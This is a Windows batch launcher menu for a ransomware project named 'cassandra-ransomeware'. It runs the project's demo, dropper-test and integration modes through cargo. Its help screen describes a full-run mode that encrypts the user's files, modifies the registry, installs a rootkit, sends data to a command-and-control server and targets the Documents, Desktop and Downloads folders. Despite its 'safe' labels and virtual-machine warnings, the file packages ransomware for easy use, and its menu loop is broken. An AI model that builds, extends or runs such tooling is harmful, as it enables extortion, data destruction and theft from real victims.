@echo off
echo ========================================
echo    cassandra-ransomeware Ransomware - Easy Launcher
echo ========================================
echo.
echo This tool makes it EASY to use cassandra-ransomeware Ransomware safely!
echo.
echo What do you want to do?
echo.
echo 1. SAFE DEMO - See all features (No risk!)
echo 2. QUICK TEST - Test basic functions
echo 3. FULL TEST - Test everything together
echo 4. HELP - Show detailed instructions
echo 5. EXIT
echo.
set /p choice="Choose 1-5: "

if "%choice%"=="1" goto demo
if "%choice%"=="2" goto quicktest
if "%choice%"=="3" goto fulltest
if "%choice%"=="4" goto help
if "%choice%"=="5" goto exit

echo Invalid choice!
pause
goto start

:demo
cls
echo ========================================
echo          SAFE DEMO MODE
echo ========================================
echo.
echo This shows ALL features without ANY risk!
echo No files will be touched, no system changes.
echo.
echo Press any key to start demo...
pause >nul
echo.
cargo run -- --demo
echo.
echo Demo completed! Your system is SAFE.
echo.
pause
goto start

:quicktest
cls
echo ========================================
echo          QUICK TEST MODE
echo ========================================
echo.
echo Testing dropper chain only (safe)
echo.
cargo run -- test
echo.
echo Test completed!
echo.
pause
goto start

:fulltest
cls
echo ========================================
echo          FULL INTEGRATION TEST
echo ========================================
echo.
echo Testing ALL components together (safe)
echo.
cargo run -- integration
echo.
echo Full test completed!
echo.
pause
goto start

:help
cls
echo ========================================
echo          HOW TO USE cassandra-ransomeware
echo ========================================
echo.
echo STEP 1: Choose what you want to do
echo -----------------------------------
echo 1. SAFE DEMO     = See all features, no risk
echo 2. QUICK TEST    = Test dropper only
echo 3. FULL TEST     = Test everything
echo 4. FULL RUN      = Actually encrypt (DANGER!)
echo.
echo STEP 2: What happens in each mode?
echo -----------------------------------
echo SAFE DEMO:
echo - Shows all ransomware capabilities
echo - No files touched, no system changes
echo - Perfect for learning and demo
echo.
echo QUICK TEST:
echo - Tests multi-stage dropper chain
echo - No encryption, no system changes
echo.
echo FULL TEST:
echo - Tests all components working together
echo - Conceptual operations only
echo - Safe for development
echo.
echo FULL RUN (NEVER DO THIS):
echo - Actually encrypts your files
echo - Modifies system registry
echo - Installs rootkit
echo - Sends data to C2 server
echo - ONLY USE IN VIRTUAL MACHINE!
echo.
echo STEP 3: No file preparation needed!
echo -----------------------------------
echo - Just run the launcher
echo - Ransomware finds files automatically
echo - Targets: Documents, Desktop, Downloads, etc.
echo - Uses AI to prioritize valuable files
echo.
echo STEP 4: Safe usage tips
echo -----------------------
echo - Always use DEMO mode first
echo - Test in FULL TEST mode
echo - Never run FULL RUN on real computer
echo - Use Virtual Machine for real testing
echo.
pause
goto start

:exit
echo Goodbye!
exit /b

:start
goto demo